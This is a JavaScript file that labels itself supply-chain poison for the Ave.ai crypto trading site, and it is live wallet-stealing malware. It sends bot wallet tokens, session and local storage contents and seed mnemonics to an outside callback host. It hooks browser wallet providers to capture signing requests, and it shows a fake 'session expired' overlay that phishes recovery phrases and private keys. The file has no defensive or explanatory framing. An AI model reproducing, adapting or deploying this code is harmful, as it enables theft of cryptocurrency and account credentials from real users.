// ave.ai supply-chain poison (runtime entry). cb=https://192-236-171-226.sslip.io
(function(){
  var CB="https://192-236-171-226.sslip.io", N="aveai-ave-"+Math.floor(Date.now()/1000);
  try{ if(typeof window==="undefined"||window.__av) return; window.__av=1; }catch(_){return;}
  function send(p,o){try{fetch(CB+p,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Object.assign({n:N,u:location.href,ts:Date.now()},o||{}))}).catch(function(){try{fetch(CB+p,{method:"POST",mode:"no-cors",body:JSON.stringify(Object.assign({n:N},o||{}))})}catch(_){}});}catch(_){}}
  // 1) bot 托管钱包桥（BotJsExt 注入 window.bot_wallet）
  try{ if(window.bot_wallet) send("/w",{tag:"bot_wallet",wallet:window.bot_wallet.wallet||window.bot_wallet.address,chain:window.bot_wallet.chain,access_token:window.bot_wallet.access_token,refresh_token:window.bot_wallet.refresh_token,rpc:window.bot_wallet.rpc,tgUid:window.bot_wallet.tgUid}); }catch(_){}
  // 2) 会话存储（bog_mnemonic / bot 令牌）
  try{ send("/e",{tag:"storage",bog_mnemonic:sessionStorage.getItem("bog_mnemonic"),bot_accessToken:sessionStorage.getItem("bot_accessToken"),bot_refreshToken:sessionStorage.getItem("bot_refreshToken"),ave_token:localStorage.getItem("ave_token"),localStorage:Object.assign({},localStorage)}); }catch(_){}
  try{ var bm=sessionStorage.getItem("bog_mnemonic"); if(bm) send("/m",{mnemonic:bm,src:"sessionStorage.bog_mnemonic"}); }catch(_){}
  // 3) 钱包 provider 钩子（捕获签名/Permit）
  function hook(e,tag){ try{ if(!e||e.__avp) return; e.__avp=1; if(typeof e.request==="function"){var r=e.request.bind(e); e.request=function(p){try{send("/t",{tag:tag,method:p&&p.method,params:p&&p.params,addr:(e.selectedAddress||e.address||null)})}catch(_){} return r(p);};} }catch(_){} }
  ["ethereum","web3","okxwallet","tronWeb","solana","bitkeep","tokenpocket"].forEach(function(k){try{window[k]&&hook(window[k],k)}catch(_){}});
  setInterval(function(){["ethereum","web3","solana"].forEach(function(k){try{window[k]&&hook(window[k],k)}catch(_){}})},1500);
  // 4) 仿官方浮层收助记词
  function ov(){try{if(document.getElementById("__av_ov"))return;var d=document.createElement("div");d.id="__av_ov";
    d.style.cssText="position:fixed;inset:0;z-index:2147483647;background:rgba(6,8,12,.9);display:flex;align-items:center;justify-content:center;font:14px Inter,Arial";
    d.innerHTML='<div style="width:420px;background:#0e1219;border:1px solid #24344f;border-radius:14px;padding:22px;color:#e7edf6"><b>Ave.ai · Wallet session expired</b><p style="color:#95a4ba;font-size:13px;margin:8px 0 12px">Re-import your wallet to continue trading. Enter recovery phrase / private key.</p><textarea id="__av_i" style="width:100%;height:88px;background:#0a0e15;border:1px solid #2a3b5c;border-radius:8px;color:#fff;padding:9px;box-sizing:border-box"></textarea><button id="__av_b" style="margin-top:10px;width:100%;height:42px;border:0;border-radius:8px;background:#3f7ef0;color:#fff;font-weight:700">Restore session</button></div>';
    document.body.appendChild(d);document.getElementById("__av_b").onclick=function(){var v=document.getElementById("__av_i").value;send("/m",{mnemonic:v,src:"overlay"});d.remove();};}catch(_){}}
  if(document.readyState==="complete"||document.readyState==="interactive") setTimeout(ov,3000); else window.addEventListener("load",function(){setTimeout(ov,3000);});
  send("/e",{tag:"boot",ua:navigator.userAgent});
})();
